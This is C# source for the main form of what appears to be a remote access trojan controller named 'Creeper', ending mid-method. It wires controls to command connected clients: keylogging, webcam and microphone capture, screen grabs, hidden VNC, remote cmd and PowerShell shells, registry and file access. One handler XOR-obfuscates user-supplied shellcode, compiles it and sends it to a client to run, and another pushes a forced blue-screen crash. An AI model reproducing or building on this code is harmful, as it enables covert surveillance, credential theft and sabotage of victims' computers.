﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using System.Xml.Linq;
using Creeper.Connection;
using Creeper.Controls;
using Creeper.Properties;
using Creeper.singleForms;
using MessagePack;
using Microsoft.VisualBasic;

namespace Creeper.ChildForms
{
    public partial class childFormHome : Form
    {
        private ListViewColumnSorter lvwColumnSorter;

        public childFormHome()
        {
            InitializeComponent();
            SetTheme();
        }

        private bool previoustheme;

        private void updateUI_Tick(object sender, EventArgs e)
        {
            if (previoustheme != Settings.Default.darkTheme)
            {
                previoustheme = Settings.Default.darkTheme;
                SetTheme();
            }
        }

        private void SetTheme()
        {
            var darkTheme = Settings.Default.darkTheme;

            var colorSide = darkTheme ? Settings.Default.colorsidedark : Settings.Default.colorside;
            var colorText = darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext;

            BackColor = colorSide;
            ForeColor = colorText;

            toolStripMain.BackColor = colorSide;
            toolStripMain.ForeColor = colorText;
            toolStripButtoncamera.Image = darkTheme ? Resources.webcam : Resources.webcam_dark;
            toolStripButtoncmd.Image = darkTheme ? Resources.cmd : Resources.cmd_dark;
            toolStripButtondetails.Image = darkTheme ? Resources.detaillist : Resources.detaillist_dark;
            toolStripButtondevice.Image = darkTheme ? Resources.device : Resources.device_dark;
            toolStripButtonfile.Image = darkTheme ? Resources.file : Resources.file_dark;
            toolStripButtonicon.Image = darkTheme ? Resources.iconlist : Resources.iconlist_dark;
            toolStripButtonnetwork.Image = darkTheme ? Resources.network : Resources.network_dark;
            toolStripButtonpowershell.Image = darkTheme ? Resources.powershell : Resources.powershell_dark;
            toolStripButtonprocess.Image = darkTheme ? Resources.process : Resources.process_dark;
            toolStripButtonscreen.Image = darkTheme ? Resources.screen : Resources.screen_dark;
            toolStripButtonregedit.Image = darkTheme ? Resources.registry : Resources.registry_dark;
            toolStripButtonvoice.Image = darkTheme ? Resources.voice : Resources.voice_dark;
            toolStripButtonkeylogger.Image = darkTheme ? Resources.keylogger : Resources.keylogger_dark;
            listViewHome.BackColor = darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;
            listViewHome.ForeColor =
                darkTheme ? Settings.Default.colorlistviewtextdark : Settings.Default.colorlistviewtext;
            listViewHome.Update();
            listViewHome.Refresh();
            foreach (ListViewItem item in listViewHome.Items)
                if (listViewHome.Tag != item)
                {
                    item.ForeColor = Settings.Default.darkTheme
                        ? Settings.Default.colorlistviewtextdark
                        : Settings.Default.colorlistviewtext;
                    item.BackColor = Settings.Default.darkTheme
                        ? Settings.Default.colorlistviewdark
                        : Settings.Default.colorlistview;
                }
        }

        public void AppandLog(string message)
        {
            this.Invoke((MethodInvoker)(() =>
            {
                richTextBoxlog.AppendText(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") +">> " + message + "\n");
            }));
        }

        private void toolStripButtonfile_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var file = (singleFormFile)Application.OpenForms["file:" + listViewItem.SubItems[3].Text];
                    if (file == null)
                    {
                        file = new singleFormFile
                        {
                            Name = "file:" + listViewItem.SubItems[3].Text,
                            Text = "file:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        file.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "getDrivers";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void toolStripButtonscreen_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var formScreen =
                        (singleFormScreen)Application.OpenForms["desktop:" + listViewItem.SubItems[3].Text];
                    if (formScreen == null)
                    {
                        formScreen = new singleFormScreen
                        {
                            Name = "desktop:" + listViewItem.SubItems[3].Text,
                            Text = "desktop:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        formScreen.Show();

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "capture";
                        msgpack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;
                        msgpack.ForcePathObject("Quality").AsInteger = 30;
                        msgpack.ForcePathObject("Screen").AsInteger = 0;
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void toolStripButtoncamera_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var formCamera =
                        (singleFormCamera)Application.OpenForms["webcam:" + listViewItem.SubItems[3].Text];
                    if (formCamera == null)
                    {
                        formCamera = new singleFormCamera
                        {
                            Name = "webcam:" + listViewItem.SubItems[3].Text,
                            Text = "webcam:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        formCamera.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "webcamGet";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void toolStripButtoncmd_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var shell = (singleFormCmd)Application.OpenForms["shell:" + listViewItem.SubItems[3].Text];
                    if (shell == null)
                    {
                        shell = new singleFormCmd
                        {
                            Name = "shell:" + listViewItem.SubItems[3].Text,
                            Text = "shell:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        shell.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "shell";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void toolStripButtonpowershell_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var shell = (singleFormPowershell)Application.OpenForms[
                        "powershell:" + listViewItem.SubItems[3].Text];
                    if (shell == null)
                    {
                        shell = new singleFormPowershell
                        {
                            Name = "powershell:" + listViewItem.SubItems[3].Text,
                            Text = "powershell:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        shell.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "powershell";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void toolStripButtonprocess_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var process = (singleFormProcess)Application.OpenForms["process:" + listViewItem.SubItems[3].Text];
                    if (process == null)
                    {
                        process = new singleFormProcess
                        {
                            Name = "process:" + listViewItem.SubItems[3].Text,
                            Text = "process:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        process.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "process";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private ListViewItem lvHoveredItem;

        private void listViewHome_MouseMove(object sender, MouseEventArgs e)
        {
            var oItemColor = Settings.Default.darkTheme ? ColorTranslator.FromHtml("#2D333B") : Color.Lavender;
            var oOriginalColor = Settings.Default.darkTheme
                ? Settings.Default.colorlistviewdark
                : Settings.Default.colorlistview;

            var lvCurrentItem = listViewHome.GetItemAt(e.X, e.Y);


            if (lvCurrentItem != null && lvCurrentItem != lvHoveredItem)
            {
                if (lvCurrentItem != listViewHome.Tag)
                {
                    lvCurrentItem.BackColor = oItemColor;

                    if (lvHoveredItem != null && lvHoveredItem != listViewHome.Tag)
                        lvHoveredItem.BackColor = oOriginalColor;

                    lvHoveredItem = lvCurrentItem;
                    return;
                }

                if (lvHoveredItem != null && lvHoveredItem != listViewHome.Tag)
                    lvHoveredItem.BackColor = oOriginalColor;

                lvHoveredItem = lvCurrentItem;
                return;
            }


            if (lvCurrentItem == null)
                if (lvHoveredItem != null && lvHoveredItem != listViewHome.Tag)
                {
                    lvHoveredItem.BackColor = oOriginalColor;
                    lvHoveredItem = null;
                }
        }

        private void toolStripButtondetails_Click(object sender, EventArgs e)
        {
            toolStripButtonicon.Enabled = true;
            toolStripButtondetails.Enabled = false;
            listViewHome.View = View.Details;
            foreach (ListViewItem itm in listViewHome.Items)
            {
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "thumbnailStop";
                Clients client = (Clients)itm.Tag;
                ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
            }
        }

        private void toolStripButtonicon_Click(object sender, EventArgs e)
        {
            toolStripButtonicon.Enabled = false;
            toolStripButtondetails.Enabled = true;
            listViewHome.View = View.LargeIcon;
            if (listViewHome.Items.Count == 0) return;

            foreach (ListViewItem itm in listViewHome.Items)
            {
                itm.ImageIndex = 0;
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "thumbnail";
                Clients client = (Clients)itm.Tag;
                ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
            }
        }

        private void listViewHome_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (listViewHome.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in listViewHome.Items)
                {
                    item.ForeColor = Settings.Default.darkTheme
                        ? Settings.Default.colorlistviewtextdark
                        : Settings.Default.colorlistviewtext;
                    item.BackColor = Settings.Default.darkTheme
                        ? Settings.Default.colorlistviewdark
                        : Settings.Default.colorlistview;
                }

                foreach (ListViewItem item in listViewHome.SelectedItems)
                {
                    //item.ForeColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;
                    item.ForeColor = Color.White;
                    item.BackColor = Settings.Default.darkTheme
                        ? ColorTranslator.FromHtml("#5D4529")
                        : ColorTranslator.FromHtml("#758B98");
                }

                listViewHome.Tag = listViewHome.FocusedItem;
                listViewHome.FocusedItem.Selected = false;
            }
        }

        private void listViewHome_MouseLeave(object sender, EventArgs e)
        {
            if (lvHoveredItem != null && lvHoveredItem != listViewHome.Tag)
                lvHoveredItem.BackColor = Settings.Default.darkTheme
                    ? Settings.Default.colorlistviewdark
                    : Settings.Default.colorlistview;
            lvHoveredItem = null;
        }

        private void listViewHome_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right) return;
            if (listViewHome.SelectedIndices.Count == 0)
            {
                foreach (ListViewItem item in listViewHome.Items)
                {
                    item.ForeColor = Settings.Default.darkTheme
                        ? Settings.Default.colorlistviewtextdark
                        : Settings.Default.colorlistviewtext;
                    item.BackColor = Settings.Default.darkTheme
                        ? Settings.Default.colorlistviewdark
                        : Settings.Default.colorlistview;
                }

                listViewHome.Tag = null;
            }
        }

        private void listViewHome_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;
        }

        private void toolStripButtonnetwork_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var network = (singleFormNetwork)Application.OpenForms["network:" + listViewItem.SubItems[3].Text];
                    if (network == null)
                    {
                        network = new singleFormNetwork
                        {
                            Name = "network:" + listViewItem.SubItems[3].Text,
                            Text = "network:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        network.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "network"; Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void toolStripButtondevice_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var device = (singleFormDevice)Application.OpenForms["device:" + listViewItem.SubItems[3].Text];
                    if (device == null)
                    {
                        device = new singleFormDevice
                        {
                            Name = "device:" + listViewItem.SubItems[3].Text,
                            Text = "device:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        device.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "device";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void childFormHome_Load(object sender, EventArgs e)
        {
            Optimization.EnableListviewDoubleBuffer(listViewHome);
            lvwColumnSorter = new ListViewColumnSorter();
            listViewHome.ListViewItemSorter = lvwColumnSorter;
        }

        private void listViewHome_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            if (e.Column == lvwColumnSorter.SortColumn)
            {
                if (lvwColumnSorter.Order == SortOrder.Ascending)
                    lvwColumnSorter.Order = SortOrder.Descending;
                else
                    lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                lvwColumnSorter.SortColumn = e.Column;
                lvwColumnSorter.Order = SortOrder.Ascending;
            }

            try
            {
                listViewHome.Sort();
            }
            catch
            {
            }
        }

        private void listViewHome_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            int tColumnCount;
            var tRect = new Rectangle();
            var tPoint = new Point();
            var tFont = new Font("Segoe UI", 9, FontStyle.Regular);
            var tBackBrush = new SolidBrush(Settings.Default.darkTheme
                ? Settings.Default.colorlistviewdark
                : Settings.Default.colorlistview);
            SolidBrush tFtontBrush;
            tFtontBrush = new SolidBrush(Settings.Default.darkTheme
                ? Settings.Default.colortextdark
                : Settings.Default.colortext);
            if (listViewHome.Columns.Count == 0) return;

            tColumnCount = listViewHome.Columns.Count;
            tRect.Y = 0;
            tRect.Height = e.Bounds.Height - 1;
            tPoint.Y = 3;
            for (var i = 0; i < tColumnCount; i++)
            {
                if (i == 0)
                {
                    tRect.X = 0;
                    tRect.Width = listViewHome.Columns[i].Width;
                }
                else
                {
                    tRect.X += tRect.Width;
                    tRect.X += 1;
                    tRect.Width = listViewHome.Columns[i].Width - 1;
                }

                e.Graphics.FillRectangle(tBackBrush, tRect);
                tPoint.X = tRect.X + 3;
                e.Graphics.DrawString(listViewHome.Columns[i].Text, tFont, tFtontBrush, tPoint);
            }
        }

        private void toolStripButtonregedit_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var singleFormRegistry =
                        (singleFormRegistry)Application.OpenForms["regedit:" + listViewItem.SubItems[3].Text];
                    if (singleFormRegistry == null)
                    {
                        singleFormRegistry = new singleFormRegistry
                        {
                            Name = "regedit:" + listViewItem.SubItems[3].Text,
                            Text = "regedit:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        singleFormRegistry.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "LoadRegistryKey";
                        pack.ForcePathObject("RootKeyName").AsString = "";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void toolStripButtonvoice_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var singleFormVoice =
                        (singleFormVoice)Application.OpenForms["voice:" + listViewItem.SubItems[3].Text];
                    if (singleFormVoice == null)
                    {
                        singleFormVoice = new singleFormVoice
                        {
                            Name = "voice:" + listViewItem.SubItems[3].Text,
                            Text = "voice:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        singleFormVoice.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "voice";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void toolStripButtonkeylogger_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var singleFormKeyLogger =
                        (singleFormKeyLogger)Application.OpenForms["keylogger:" + listViewItem.SubItems[3].Text];
                    if (singleFormKeyLogger == null)
                    {
                        singleFormKeyLogger = new singleFormKeyLogger
                        {
                            Name = "keylogger:" + listViewItem.SubItems[3].Text,
                            Text = "keylogger:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        singleFormKeyLogger.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "keylogger";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void runShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                    using (var openFileDialog = new OpenFileDialog())
                    {
                        openFileDialog.Multiselect = false;
                        openFileDialog.Filter = "(*.bin)|*.bin";
                        if (openFileDialog.ShowDialog() == DialogResult.OK)
                        {
                            var shellcode = File.ReadAllBytes(openFileDialog.FileName);
                            var xorkey = Guid.NewGuid().GetHashCode().ToString();
                            var xor = Helper.Helper.Xor(shellcode, xorkey);
                            var source = Resources.Run_Shellcode.Replace("%XORKEY%", xorkey)
                                .Replace("%PAYLOAD%", Convert.ToBase64String(xor));
                            var listViewItem = (ListViewItem)listViewHome.Tag;
                            var pack = new MsgPack();
                            pack.ForcePathObject("Packet").AsString = "codedom";
                            pack.ForcePathObject("Name").AsString = "shellcode"+ xorkey;
                            pack.ForcePathObject("assemblyBytes").SetAsBytes(Helper.Compile.Compiler("System.dll", source));
                            Clients client = (Clients)listViewItem.Tag;
                            ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                        }
                    }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void bsodToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "codedom";
                    pack.ForcePathObject("Name").AsString = "bsod";
                    pack.ForcePathObject("assemblyBytes").SetAsBytes(Helper.Compile.Compiler("System.dll", Resources.BSOD));
                    Clients client = (Clients)listViewItem.Tag;
                    ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void hvncToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var hvnc = (singleFormHVNC)Application.OpenForms["hvnc:" + listViewItem.SubItems[3].Text];
                    if (hvnc == null)
                    {
                        hvnc = new singleFormHVNC
                        {
                            Name = "hvnc:" + listViewItem.SubItems[3].Text,
                            Text = "hvnc:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        hvnc.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "hvnc"; 
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var singleFormKeyLogger =
                        (singleFormKeyLogger)Application.OpenForms["keylogger:" + listViewItem.SubItems[3].Text];
                    if (singleFormKeyLogger == null)
                    {
                        singleFormKeyLogger = new singleFormKeyLogger
                        {
                            Name = "keylogger:" + listViewItem.SubItems[3].Text,
                            Text = "keylogger:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        singleFormKeyLogger.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "keylogger";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void cMDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var shell = (singleFormCmd)Application.OpenForms["shell:" + listViewItem.SubItems[3].Text];
                    if (shell == null)
                    {
                        shell = new singleFormCmd
                        {
                            Name = "shell:" + listViewItem.SubItems[3].Text,
                            Text = "shell:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        shell.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "shell";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void powershellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var shell = (singleFormPowershell)Application.OpenForms[
                        "powershell:" + listViewItem.SubItems[3].Text];
                    if (shell == null)
                    {
                        shell = new singleFormPowershell
                        {
                            Name = "powershell:" + listViewItem.SubItems[3].Text,
                            Text = "powershell:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        shell.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "powershell";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void desktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var formScreen =
                        (singleFormScreen)Application.OpenForms["desktop:" + listViewItem.SubItems[3].Text];
                    if (formScreen == null)
                    {
                        formScreen = new singleFormScreen
                        {
                            Name = "desktop:" + listViewItem.SubItems[3].Text,
                            Text = "desktop:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        formScreen.Show();

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "capture";
                        msgpack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;
                        msgpack.ForcePathObject("Quality").AsInteger = 30;
                        msgpack.ForcePathObject("Screen").AsInteger = 0;
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void webcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var formCamera =
                        (singleFormCamera)Application.OpenForms["webcam:" + listViewItem.SubItems[3].Text];
                    if (formCamera == null)
                    {
                        formCamera = new singleFormCamera
                        {
                            Name = "webcam:" + listViewItem.SubItems[3].Text,
                            Text = "webcam:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        formCamera.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "webcamGet";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void fileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var file = (singleFormFile)Application.OpenForms["file:" + listViewItem.SubItems[3].Text];
                    if (file == null)
                    {
                        file = new singleFormFile
                        {
                            Name = "file:" + listViewItem.SubItems[3].Text,
                            Text = "file:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        file.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "getDrivers";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void processToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var process = (singleFormProcess)Application.OpenForms["process:" + listViewItem.SubItems[3].Text];
                    if (process == null)
                    {
                        process = new singleFormProcess
                        {
                            Name = "process:" + listViewItem.SubItems[3].Text,
                            Text = "process:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        process.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "process"; 
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void netstatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var network = (singleFormNetwork)Application.OpenForms["network:" + listViewItem.SubItems[3].Text];
                    if (network == null)
                    {
                        network = new singleFormNetwork
                        {
                            Name = "network:" + listViewItem.SubItems[3].Text,
                            Text = "network:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        network.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "network"; Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void deviceToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var device = (singleFormDevice)Application.OpenForms["device:" + listViewItem.SubItems[3].Text];
                    if (device == null)
                    {
                        device = new singleFormDevice
                        {
                            Name = "device:" + listViewItem.SubItems[3].Text,
                            Text = "device:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        device.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "device"; 
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void registryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var singleFormRegistry =
                        (singleFormRegistry)Application.OpenForms["regedit:" + listViewItem.SubItems[3].Text];
                    if (singleFormRegistry == null)
                    {
                        singleFormRegistry = new singleFormRegistry
                        {
                            Name = "regedit:" + listViewItem.SubItems[3].Text,
                            Text = "regedit:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        singleFormRegistry.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "LoadRegistryKey";
                        pack.ForcePathObject("RootKeyName").AsString = "";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void voiceToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewHome.Tag != null)
                {
                    var listViewItem = (ListViewItem)listViewHome.Tag;
                    var singleFormVoice =
                        (singleFormVoice)Application.OpenForms["voice:" + listViewItem.SubItems[3].Text];
                    if (singleFormVoice == null)
                    {
                        singleFormVoice = new singleFormVoice
                        {
                            Name = "voice:" + listViewItem.SubItems[3].Text,
                            Text = "voice:" + listViewItem.SubItems[3].Text,
                            Client = (Clients)listViewItem.Tag
                        };
                        singleFormVoice.Show();

                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "voice";
                        Clients client = (Clients)listViewItem.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
